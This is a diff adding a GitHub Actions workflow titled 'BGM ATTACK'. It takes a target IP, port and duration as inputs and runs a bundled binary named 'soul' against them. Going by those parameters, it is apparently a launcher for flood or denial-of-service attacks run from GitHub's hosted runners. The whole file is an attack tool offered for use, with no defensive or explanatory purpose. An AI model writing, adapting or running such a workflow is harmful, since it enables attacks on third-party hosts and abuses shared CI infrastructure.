@@ -1,0 +1,22 @@
+name: BGM ATTACK
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: 'Target IP'
+        required: true
+      port:
+        description: 'Port'
+        required: true
+      time:
+        description: 'Time (seconds)'
+        required: true
+jobs:
+  attack:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v2
+      - name: Run Attack
+        run: |
+          chmod +x soul
+          ./soul ${{ github.event.inputs.target }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }}
